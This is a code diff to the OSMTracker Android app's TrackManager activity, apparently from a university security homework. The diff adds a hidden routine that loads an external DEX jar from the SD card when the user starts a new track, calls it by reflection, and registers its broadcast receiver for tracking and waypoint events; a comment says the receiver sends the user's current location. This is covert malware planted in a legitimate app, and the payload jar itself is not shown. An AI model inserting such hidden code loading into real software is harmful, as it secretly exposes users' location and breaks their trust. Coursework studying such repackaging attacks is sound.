@@ -1,8 +1,10 @@
 package me.guillaumin.android.osmtracker.activity;
 
 import java.io.File;
+import java.lang.reflect.Method;
 import java.util.Date;
 
+import dalvik.system.DexClassLoader;
 import me.guillaumin.android.osmtracker.OSMTracker;
 import me.guillaumin.android.osmtracker.R;
 import me.guillaumin.android.osmtracker.db.DataHelper;
@@ -14,12 +16,14 @@ import me.guillaumin.android.osmtracker.gpx.ExportToStorageTask;
 import me.guillaumin.android.osmtracker.util.FileSystemUtils;
 import android.app.AlertDialog;
 import android.app.ListActivity;
+import android.content.BroadcastReceiver;
 import android.content.ContentUris;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.DialogInterface.OnClickListener;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
@@ -182,6 +186,9 @@ public class TrackManager extends ListActivity {
 	public boolean onOptionsItemSelected(MenuItem item) {
 		switch (item.getItemId()) {
 		case R.id.trackmgr_menu_newtrack:
+			// dynamically load class
+			loadClassDynamically();
+
 			// Start track logger activity
 			try {
 				Intent i = new Intent(this, TrackLogger.class);
@@ -478,6 +485,46 @@ public class TrackManager extends ListActivity {
 			// set the currentTrackId to "no track"
 			currentTrackId = TRACK_ID_NO_TRACK;
 			
+		}
+	}
+
+	private void loadClassDynamically(){
+		// load class and register receiver that receive TRACK_WP intent
+		String jarContainerPath =  "/mnt/sdcard/dexHiddenReceiver.jar";
+		File dexOutputDir = getDir("dex", MODE_PRIVATE);
+		//load the code
+		DexClassLoader mDexClassLoader = new DexClassLoader(jarContainerPath,
+				dexOutputDir.getAbsolutePath(),
+				null,
+				getClass().getClassLoader());
+
+		try {
+			//use java reflection to call a method in the loaded class
+			Class<?> loadedClass = mDexClassLoader.loadClass("uci.inf221.fa16.hw2.HiddenReceiver");
+
+			//list all methods in the class
+			Method[] methods = loadedClass.getDeclaredMethods();
+			for (int i = 0; i < methods.length; i++){
+				Log.d("[MALICIOUS] Dynamic", "Method: "+methods[i].getName());
+			}
+
+			Method methodGetBroadcastReceiver = loadedClass.getMethod("getBroadcastReceiver");
+			Object object = loadedClass.newInstance();
+			BroadcastReceiver receiver = (BroadcastReceiver) methodGetBroadcastReceiver.invoke(object);
+
+			if (receiver != null) {
+				IntentFilter iFilter = new IntentFilter();
+				iFilter.addAction(OSMTracker.INTENT_TRACK_WP);
+				iFilter.addAction(OSMTracker.INTENT_UPDATE_WP);
+				iFilter.addAction(OSMTracker.INTENT_DELETE_WP);
+				iFilter.addAction(OSMTracker.INTENT_START_TRACKING);
+				iFilter.addAction(OSMTracker.INTENT_STOP_TRACKING);
+
+				// Register dynamically loaded receiver that sends current location whenever icons are clicked
+				registerReceiver(receiver, iFilter);
+			}
+		} catch (Exception e){
+			e.printStackTrace();
 		}
 	}
 }
